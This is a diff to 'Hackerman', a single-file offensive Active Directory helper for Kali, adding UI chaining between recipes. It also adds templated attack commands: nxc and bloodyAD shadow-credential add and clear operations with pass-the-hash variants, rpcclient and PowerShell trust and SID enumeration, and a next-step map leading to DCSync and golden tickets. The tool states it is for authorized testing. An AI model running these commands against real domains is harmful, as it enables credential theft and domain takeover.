@@ -137,6 +137,9 @@ body.focus-open{overflow:hidden}
 .chip.t1.on{background:#151c2b;border-color:#334155;color:#94a3b8}
 .reqchip{font-size:10.5px;padding:2px 7px;border-radius:5px;border:1px solid #7c4a03;background:#2a1c05;color:#fbbf24;white-space:nowrap}
 .reqrow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;font-size:11.5px}
+.nextrow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;font-size:11.5px}
+.nextchip{font-size:10.5px;padding:2px 7px;border-radius:5px;border:1px solid #155e75;background:#0b2230;color:#67e8f9;white-space:nowrap;cursor:pointer}
+.nextchip:hover{border-color:#22d3ee}
 .badge.reqmore{color:#fbbf24}
 .stepreq{font-size:11.5px;color:#fbbf24;margin:0 0 8px}
 .prereqbox{background:#1c1508;border:1px solid #7c4a03;border-radius:8px;padding:7px 10px;font-size:12.3px;color:#e8d9b8;margin:0 0 12px}
@@ -944,6 +947,23 @@ function reqChip(t, prefix){
   return c;
 }
 
+function nextTargets(r){
+  return (NEXT[r.id] || []).map(t => {
+    if(t.indexOf('flow:') === 0){
+      const f = FLOWS.find(x => x.id === t.slice(5));
+      return f ? {kind:'flow', id:f.id, title:f.title} : null;
+    }
+    const rr = RECIPES.find(x => x.id === t);
+    return rr ? {kind:'recipe', id:rr.id, title:rr.title} : null;
+  }).filter(Boolean);
+}
+function goNext(t){
+  if(t.kind === 'flow'){
+    $$('#tabs button').find(b => b.dataset.tab === 'wizard').click();
+    activeFlow = t.id; renderWizard(); window.scrollTo({top:0});
+  } else openFocus(t.id);
+}
+
 function recipeCard(r, alwaysExpanded){
   const card = document.createElement('div');
   card.className = 'recipe';
@@ -1056,6 +1076,23 @@ function recipeCard(r, alwaysExpanded){
       n.className = 'note';
       n.innerHTML = renderNote(r.note);
       card.appendChild(n);
+    }
+    const nx = nextTargets(r);
+    if(nx.length){
+      const row = document.createElement('div');
+      row.className = 'nextrow';
+      const rl = document.createElement('span');
+      rl.className = 'dim'; rl.textContent = 'next →';
+      row.appendChild(rl);
+      nx.forEach(t => {
+        const c = document.createElement('span');
+        c.className = 'nextchip';
+        c.textContent = (t.kind === 'flow' ? 'flow: ' : '') + t.title;
+        c.title = 'go to ' + (t.kind === 'flow' ? 'wizard flow: ' : '') + t.title;
+        c.addEventListener('click', e => { e.stopPropagation(); goNext(t); });
+        row.appendChild(c);
+      });
+      card.appendChild(row);
     }
   }
   return card;
@@ -1666,7 +1703,7 @@ function renderLegend(){
   const about = document.createElement('div');
   about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v2.0.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
-    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries · 106 <b>flashcards</b> (separate page, header button). Offline, no dependencies, no telemetry.</p>' +
+    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries · 126 <b>flashcards</b> (separate page, header button). Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Context fields run <b>plausibility checks</b> (⚠ badge, tooltip; warn-only) and recipe commands support <b>conditional blocks</b> (<span class="mono">{{#if var}}…{{/if}}</span>) — the Kerberos setup conf covers the trust realm automatically.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
   tab.appendChild(about);
@@ -2903,11 +2940,16 @@ cmds:[
  [`certipy shadow auto -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy (auto: add, auth, clear) — with NT hash'],
  [`KRB5CCNAME={{ccache}} certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy via ccache'],
  [`certipy shadow auto -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'against a computer via PtH'],
- [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
- [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output) — via PtH'],
- [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential'],
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
+  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output) — via PtH'],
+  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=list`,'nxc module: list existing key credentials'],
+  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=list`,'nxc module: list existing key credentials — via PtH'],
+  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=add`,'nxc module: add key credential (PFX lands in ~/.nxc/modules/shadow-creds)'],
+  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=add`,'nxc module: add key credential — via PtH'],
+  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M shadow-creds -o TARGET='{{target_user}}' ACTION=clear`,'CLEANUP (nxc): remove all key credentials'],
+  [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential'],
  [`certipy shadow clear -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential — with NT hash']
-],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
+ ],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. <b>nxc module actions:</b> <span class="mono">list</span> (inventory), <span class="mono">add</span> (drops a PFX into <span class="mono">~/.nxc/modules/shadow-creds</span> — authenticate it with <span class="mono">certipy auth -pfx</span>), <span class="mono">info/remove</span> via <span class="mono">DEVICE_ID=…</span>, <span class="mono">clear</span> (cleanup). BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});
 
 R({id:'dacl-adminsdholder',cat:'dacl',title:'AdminSDHolder takeover → protected groups',desc:'Write an ACE on AdminSDHolder; SDProp copies it onto every protected account (Domain Admins, Enterprise Admins, ...).',
 cmds:[
@@ -3523,7 +3565,10 @@ cmds:[
  [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
  [`nltest /trusted_domains`,'quick list of trusted domains','n'],
  [`netdom trust {{domain}} /domain:{{trust_domain}} /verify`,'verify the trust + show direction','n'],
- [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,flatName,securityIdentifier,trustDirection,trustAttributes,trustType`,'FQDN + NetBIOS (flatName) + domain SID of the trust partner'],
+  [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,flatName,securityIdentifier,trustDirection,trustAttributes,trustType`,'partner SIDs with NO target creds — TDO of your own domain'],
+  [`Get-ADObject -Filter {objectClass -eq 'trustedDomain'} -Properties securityIdentifier,flatName,trustDirection,trustAttributes | ft Name,flatName,@{n='SID';e={$_.securityIdentifier}},trustDirection,trustAttributes`,'same TDO incl. partner SIDs (PowerShell, no target creds)','n'],
+  [`rpcclient -U '{{domain}}/{{user}}%{{password}}' {{dc_host}} -c 'enumtrust'`,'trusted domains + SIDs, one per line (rpcclient)'],
+  [`rpcclient -U '{{domain}}/{{user}}%{{nthash}}' --pw-nt-hash {{dc_host}} -c 'enumtrust'`,'trusted domains + SIDs (rpcclient) — via PtH'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of YOUR domain'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --get-sid`,'SID of YOUR domain — via PtH'],
  [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of the TRUSTED domain'],
@@ -3531,7 +3576,7 @@ cmds:[
  [`Get-ADTrust -Filter * | fl Name,TrustDirection,TrustType,SIDFilteringQuarantined,SIDFilteringForestAware,TreatAsExternal`,'PowerShell (RSAT): trust flags incl. SID filtering','n'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts)'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts) — via PtH']
-],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. SID-filtering quick check: <span class="mono">--dc-list</span> prints 0x4 as <span class="mono">Quarantined Domain</span>, <span class="mono">Get-ADTrust</span> as <span class="mono">SIDFilteringQuarantined: True</span> — if set, extra-sid tickets (raiseChild, SID history) lose the foreign SID. Cross-forest rule: the target forest always filters <b>RID 500–1000 (EA 519, DA 512)</b>, even with <span class="mono">/enablesidhistory:yes</span> (then <span class="mono">Treat as External</span> 0x40 appears and only RID &gt; 1000 can be spoofed). The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. A trust (even a transitive one) never grants replication rights: DCSync needs Replicating Directory Changes (All) in the target domain itself — see the trust-dcsync card.<br>Next steps: cross-domain roasting, SID history, foreign group membership, coercion/relay across the trust.<br>Queries run over <b>LDAPS (636)</b> (<span class="mono">LDAPTLS_REQCERT=never</span>); fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
+],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <b>Partner SIDs need no target creds:</b> the TrustedDomain object lives in <b>your own</b> domain and any authenticated account may read it (ldapsearch / PowerShell lines above, <span class="mono">rpcclient enumtrust</span> prints name + SID per line). <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid) — against the partner DC it authenticates with <b>your own creds via the trust</b>; real partner creds are only needed when one-way-outbound or selective authentication blocks you. <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. SID-filtering quick check: <span class="mono">--dc-list</span> prints 0x4 as <span class="mono">Quarantined Domain</span>, <span class="mono">Get-ADTrust</span> as <span class="mono">SIDFilteringQuarantined: True</span> — if set, extra-sid tickets (raiseChild, SID history) lose the foreign SID. Cross-forest rule: the target forest always filters <b>RID 500–1000 (EA 519, DA 512)</b>, even with <span class="mono">/enablesidhistory:yes</span> (then <span class="mono">Treat as External</span> 0x40 appears and only RID &gt; 1000 can be spoofed). The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. A trust (even a transitive one) never grants replication rights: DCSync needs Replicating Directory Changes (All) in the target domain itself — see the trust-dcsync card.<br>Next steps: cross-domain roasting, SID history, foreign group membership, coercion/relay across the trust.<br>Queries run over <b>LDAPS (636)</b> (<span class="mono">LDAPTLS_REQCERT=never</span>); fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
 cmds:[
@@ -3823,7 +3868,7 @@ steps:[
  {t:'Read the ACL and find write rights',d:'Confirm exactly which object/attribute you can write.',r:['dacl-enum','bloodyad-writable']},
  {q:'What do you have write rights on?', any:[
    {t:'A user',d:'Pick the least destructive option: shadow credentials, targeted kerberoast, password reset, group add.',r:['dacl-genericall-user','dacl-forcechangepassword','shadow-creds']},
-   {t:'A computer',d:'Shadow credentials on the machine, or RBCD with a rogue computer.',r:['dacl-genericall-computer','rbcd-addcomputer','rbcd-write','rbcd-getst']},
+    {t:'A computer',d:'Shadow credentials on the machine, or RBCD with a rogue computer.',r:['dacl-genericall-computer','shadow-creds','rbcd-addcomputer','rbcd-write','rbcd-getst']},
    {t:'A group',d:'Add yourself to the group, then re-authenticate.',r:['dacl-genericall-group']},
    {t:'A dMSA-capable domain (Server 2025)',d:'BadSuccessor: create a delegated MSA linked to a privileged account — verify with badsuccessor_check first.',r:['bloodyad-badsuccessor']},
    {t:'The domain object (WriteDACL/Owner)',d:'Grant DCSync, take ownership, or abuse AdminSDHolder for protected groups.',r:['dacl-writedacl-dcsync','dacl-writeowner','dacl-adminsdholder']}
@@ -3994,6 +4039,96 @@ function applyPriorities(){
   });
 }
 applyPriorities();
+
+/* ===== CHAINING: the next logical step after a technique ===== */
+const NEXT = {
+  'kerbrute':['flow:creds'], 'pw-spray':['flow:creds'],
+  'user-enum':['kerbrute','pw-spray'], 'anon-enum':['user-enum'],
+  'ldap-tls':['ldap-dump'], 'ldap-dump':['kerbrute','pw-spray'],
+  'shares':['auth-check'],
+  'auth-check':['bh-python','session-hunt'],
+  'pth-check':['lat-winrm','lat-smb-exec'],
+  'kerberoast':['auth-check','flow:creds'], 'asrep':['auth-check','flow:creds'],
+  'targeted-kerberoast':['auth-check'],
+  'keytab':['kerberos-auth','deleg-enum'],
+  'kerberos-auth':['ccache-usage'], 'kerb-check':['gettgt'],
+  'gettgt':['ccache-usage'], 'getst':['ccache-usage'],
+  'ccache-usage':['bh-nxc','lat-winrm'],
+  'ticket-inspect':['getst'], 'silver-ticket':['ccache-usage'],
+  'spn-hijack-deleg':['constrained-getst'],
+  'constrained-getst':['ccache-usage','creds-dcsync'],
+  'deleg-enum':['constrained-getst','rbcd-write','unconstrained-coerce'],
+  'rbcd-read':['rbcd-write'], 'rbcd-addcomputer':['rbcd-write'],
+  'rbcd-write':['rbcd-getst'], 'rbcd-getst':['rbcd-use'],
+  'rbcd-use':['creds-sam-lsa'], 'rbcd-bloodyad':['rbcd-getst'],
+  'dc-rbcd':['rbcd-getst','creds-dcsync'],
+  'shadow-creds':['ccache-usage','pth-check'],
+  'dacl-enum':['bloodyad-writable','flow:dacl'],
+  'bloodyad-writable':['flow:dacl'],
+  'bloodyad-basics':['bloodyad-writable'], 'bloodyad-enum':['bloodyad-writable'],
+  'bloodyad-spn':['targeted-kerberoast'], 'bloodyad-password':['auth-check'],
+  'bloodyad-uac':['asrep'], 'bloodyad-groups':['dacl-genericall-group'],
+  'bloodyad-badsuccessor':['pth-check'],
+  'dacl-genericall-user':['shadow-creds','targeted-kerberoast','dacl-forcechangepassword'],
+  'dacl-genericall-computer':['shadow-creds','rbcd-write'],
+  'dacl-genericall-group':['auth-check'],
+  'dacl-forcechangepassword':['auth-check'],
+  'dacl-writedacl-dcsync':['creds-dcsync'], 'dacl-writeowner':['dacl-writedacl-dcsync'],
+  'dacl-adminsdholder':['dacl-genericall-group'],
+  'adcs-find':['flow:adcs'],
+  'adcs-esc1':['creds-dcsync'], 'adcs-esc4':['creds-dcsync'],
+  'adcs-esc2-esc3':['creds-dcsync'], 'adcs-esc6':['creds-dcsync'],
+  'adcs-esc7':['creds-dcsync','adcs-golden-cert'], 'adcs-esc8':['creds-dcsync'],
+  'adcs-esc9-esc16':['creds-dcsync'], 'adcs-esc10':['creds-dcsync'],
+  'adcs-esc11':['creds-dcsync'], 'adcs-esc13':['creds-dcsync'],
+  'adcs-esc15':['creds-dcsync'], 'adcs-esc17':['creds-dcsync'],
+  'adcs-esc5-esc12-esc14':['creds-dcsync'], 'adcs-golden-cert':['flow:da'],
+  'creds-dcsync':['golden-ticket','flow:da'], 'golden-ticket':['flow:da'],
+  'creds-sam-lsa':['creds-dpapi','session-hunt'], 'creds-dpapi':['auth-check'],
+  'creds-gmsa':['pth-check'], 'creds-ntds-offline':['flow:creds'],
+  'sebackup':['creds-ntds-offline'],
+  'linux-loot':['keytab','kerberos-auth'], 'win-registry-loot':['auth-check'],
+  'post-seimpersonate':['creds-sam-lsa'], 'uac-bypass':['creds-sam-lsa'],
+  'krbrelay':['creds-sam-lsa'],
+  'relay-responder':['flow:creds'], 'mitm6':['relay-smb','relay-ldap'],
+  'relay-smb':['creds-sam-lsa'], 'relay-coerce':['adcs-esc8','relay-ldap','unconstrained-coerce'],
+  'relay-ldap':['relay-rbcd','creds-dcsync'], 'relay-rbcd':['rbcd-getst'],
+  'unconstrained-coerce':['creds-sam-lsa'],
+  'session-hunt':['lat-smb-exec','lat-winrm'],
+  'lat-winrm':['creds-sam-lsa'], 'lat-smb-exec':['creds-sam-lsa'],
+  'lat-impacket-exec':['creds-sam-lsa'], 'lat-rdp':['flow:foothold'],
+  'rdp-auth':['lat-rdp'], 'revshells':['flow:foothold'],
+  'post-gpo':['relay-coerce','relay-responder'], 'post-adidns':['relay-coerce'],
+  'mssql-connect':['flow:mssql'], 'mssql-impersonate':['mssql-xpcmdshell'],
+  'mssql-linked':['mssql-xpcmdshell'],
+  'mssql-xpcmdshell':['revshells','flow:foothold'], 'mssql-alt-rce':['revshells','flow:foothold'],
+  'mssql-coerce':['relay-ldap','relay-smb'], 'sccm':['mssql-connect'],
+  'trust-enum':['trust-raisechild','trust-coerce-relay','trust-foreign-groups','trust-sid-history'],
+  'trust-cross-domain-roast':['flow:creds'],
+  'trust-raisechild':['trust-dcsync'], 'trust-sid-history':['trust-dcsync'],
+  'trust-foreign-groups':['flow:trusts'], 'trust-coerce-relay':['trust-dcsync'],
+  'trust-dcsync':['golden-ticket','flow:da'],
+  'second-domain':['second-domain-mark'], 'second-domain-mark':['second-domain-recon'],
+  'second-domain-recon':['second-domain-abuse'],
+  'second-domain-abuse':['trust-coerce-relay','flow:trusts'],
+  'bh-python':['bhcli-mark-owned'], 'bh-nxc':['bhcli-mark-owned'],
+  'bhcli-setup':['bhcli-recon'], 'bhcli-recon':['bhcli-mark-owned'],
+  'bhcli-mark-owned':['bhcli-cypher'],
+  'cve-zerologon':['creds-dcsync'], 'cve-nopac':['creds-dcsync'],
+  'cve-certifried':['creds-dcsync'], 'cve-printnightmare':['flow:foothold'],
+  'dnsadmins':['creds-dcsync'], 'entra-connect':['creds-dcsync']
+};
+const NEXT_ISSUES = [];
+function applyNextLinks(){
+  Object.keys(NEXT).forEach(id => {
+    if(!RECIPES.find(r => r.id === id)) NEXT_ISSUES.push('NEXT: unknown recipe id ' + id);
+    (NEXT[id] || []).forEach(t => {
+      if(t.indexOf('flow:') === 0){ if(!FLOWS.find(f => f.id === t.slice(5))) NEXT_ISSUES.push('NEXT: unknown flow target in ' + id + ': ' + t); }
+      else if(!RECIPES.find(r => r.id === t)) NEXT_ISSUES.push('NEXT: unknown recipe target in ' + id + ': ' + t);
+    });
+  });
+}
+applyNextLinks();
 
 /* ===== HOVER HELP ===== */
 const HELP_TOOL = {
